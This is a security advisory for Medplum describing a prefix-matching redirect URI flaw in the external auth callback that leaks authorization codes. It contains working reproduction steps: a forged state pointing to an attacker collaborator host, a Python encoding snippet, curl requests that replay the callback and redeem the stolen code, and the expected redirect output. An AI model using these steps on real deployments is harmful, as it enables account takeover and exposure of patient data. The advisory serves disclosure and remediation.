summary: "Medplum: Improper Validation of Redirect URI in External Auth Callback allows Authorization\
  \ Code Leakage\n## Summary\n\nThe external identity provider callback at `GET /auth/external`\
  \ accepts attacker-controlled redirect URIs that only need to start with a registered client\
  \ redirect URI, rather than matching exactly. After a successful external IdP login, the server\
  \ appends Medplum `login` and `code` values to that attacker-supplied URL and issues a redirect.\n\
  \nBecause the external login request `state` is serialized as raw JSON and later trusted by\
  \ the callback, an attacker who can tamper with `state.redirectUri` can cause Medplum to redirect\
  \ authorization artifacts to an attacker-controlled endpoint. When the registered redirect\
  \ URI is a bare origin or another prefix that can be extended into a different hostname, this\
  \ becomes a cross-origin authorization code leak.\n\n## Technical Explanation\n\nThe vulnerable\
  \ flow is exposed on the unauthenticated callback route `GET /auth/external`.\n\nIn `externalCallbackHandler()`,\
  \ the server parses the external auth `state` and uses the decoded `clientId` and `redirectUri`\
  \ after completing the IdP code exchange. If login succeeds and a client is found, the handler\
  \ calls:\n\n- `getClientRedirectUri(client, body.redirectUri, true)`\n\nThe third argument\
  \ explicitly enables partial matching. In `getClientRedirectUri()`, the function returns the\
  \ attacker-supplied `requestedUri` whenever:\n\n- `requestedUri.startsWith(uri)`\n\nAs a result,\
  \ any redirect URI beginning with a registered value is accepted. The returned URL is then\
  \ passed into `new URL(redirectUri)`, and the server appends `login` and `code` query parameters\
  \ before calling `res.redirect()`.\n\nAlthough `externalCallbackHandler()` later performs\
  \ an exact-match lookup, that result is only used for logging and does not block the redirect.\
  \ Therefore, the request is still redirected to the attacker-controlled URL even when it is\
  \ not an exact registered redirect URI.\n\nA practical exploitation detail is that the registered\
  \ redirect URI must be a prefix that can also prefix a different origin. For example:\n\n\
  - Registered: `http://callback.audit.local`\n- Malicious: `http://callback.audit.local.oastify.com/cb`\n\
  \nThe client-side external auth flow serializes the login request directly into the IdP `state`\
  \ as JSON, which makes tampering straightforward in an intercepted or manually crafted authorization\
  \ request.\n\n## Steps to Reproduce\n\n### Preconditions\n\n- The target `ClientApplication`\
  \ has an `identityProvider` configured.\n- The target client has a registered redirect URI\
  \ that is prefix-matchable into an attacker-controlled hostname, for example:\n  - Registered\
  \ redirect URI: `http://callback.audit.local`\n- The attacker controls a collaborator endpoint\
  \ such as:\n  - `https://<collaborator-host>/cb`\n- The attacker uses a forged `state.redirectUri`\
  \ that starts with the registered value, for example:\n  - `http://callback.audit.local.oastify.com/cb`\n\
  \  - or a collaborator domain that matches your local proof setup\n\n### Example forged state\n\
  \n`{\"clientId\":\"<medplum-client-id>\",\"redirectUri\":\"http://callback.audit.local.oastify.com/cb\"\
  ,\"codeChallenge\":\"attack-verifier-123\",\"codeChallengeMethod\":\"plain\"}`\n\n**URL-encode\
  \ the forged state**\n\n```\npython3 - <<'PY'\nimport json, urllib.parse\nstate = {\n  \"\
  clientId\": \"<medplum-client-id>\",\n  \"redirectUri\": \"http://callback.audit.local.oastify.com/cb\"\
  ,\n  \"codeChallenge\": \"attack-verifier-123\",\n  \"codeChallengeMethod\": \"plain\",\n\
  }\nprint(urllib.parse.quote(json.dumps(state, separators=(',', ':'))))\nPY\n```\n\n**Replay\
  \ the external callback with cURL**\nUse a valid IdP authorization code obtained from a normal\
  \ external login flow, then call the vulnerable callback directly:\n`curl -i 'http://api.audit.local:8103/auth/external?code=<valid-idp-code>&state=<URLENCODED_FORGED_STATE>`\n\
  \nExpected result\nThe response is a 302 redirect to the attacker-controlled endpoint, including\
  \ Medplum authorization artifacts in the query string:\n\n```\nHTTP/1.1 302 Found\nLocation:\
  \ http://callback.audit.local.oastify.com/cb?login=<login-id>&code=<medplum-auth-code>\n```\n\
  \n**Collaborator proof**\nIf redirectUri points to a Burp Collaborator, Interactsh, or another\
  \ attacker-controlled HTTP endpoint, that service receives the inbound request containing\
  \ the leaked code in the query string. This demonstrates that Medplum is willing to forward\
  \ authorization artifacts to an attacker-controlled destination when state.redirectUri only\
  \ prefix-matches a registered client redirect URI.\n\n**Optional impact validation**\nIf the\
  \ attacker supplied the PKCE verifier in the forged state, the leaked Medplum code can then\
  \ be redeemed:\n\n```\ncurl -i -X POST 'http://api.audit.local:8103/oauth2/token' \\\n  -H\
  \ 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'grant_type=authorization_code&code=<medplum-auth-code>&code_verifier=attack-verifier-123'\n\
  ```\n\n## Impact\n\nThe impact of this vulnerability is Critical, as it facilitates a full\
  \ Account Takeover (ATO) of any user utilizing the external identity provider (IdP) flow.\
  \ \n\n1. Full Account Takeover (ATO): \nAn attacker can successfully intercept the Medplum\
  \ authorization 'code'. Because the attacker controls the 'state' object, they can provide\
  \ their own PKCE 'code_challenge'. This allows the attacker to redeem the stolen code for\
  \ a valid access token without knowing the victim's original secret, leading to total session\
  \ hijacking.\n\n2. Bypassing Modern OAuth Protections: \nThis flaw explicitly bypasses the\
  \ security benefits of PKCE (Proof Key for Code Exchange). By allowing an attacker to inject\
  \ their own PKCE parameters into the tampered state, the server's verification mechanism is\
  \ rendered useless against this specific redirection attack.\n\n3. Cross-Origin Data Leakage:\
  \ \nThe 'startsWith' logic allows an attacker to break out of the intended origin. For example,\
  \ a registered URI for 'https://app.medplum.com' could be extended to 'https://app.medplum.com.attacker.com',\
  \ tricking the user and the browser's security model into sending sensitive credentials to\
  \ an external host.\n\n4. Access to Sensitive Healthcare Data (PHI):\nGiven Medplum's role\
  \ as a healthcare platform, a successful compromise grants the attacker the same permissions\
  \ as the victim, potentially exposing Protected Health Information (PHI) and violating HIPAA\
  \ or other regulatory compliance standards.\n\n5. Victim Trust Exploitation:\nThe attack occurs\
  \ during a legitimate login flow. The victim interacts with the official Medplum server and\
  \ their trusted IdP (e.g., Google or Microsoft), making the final redirection to the attacker-controlled\
  \ URL nearly impossible for an average user to detect.\n\n## Mitigation\n- Require exact string\
  \ equality for redirect URIs.\n- Bind external auth state to a server-side session or use\
  \ a HMAC/Signature.\n- Reject prefixable or ambiguous redirect URI shapes during registration."
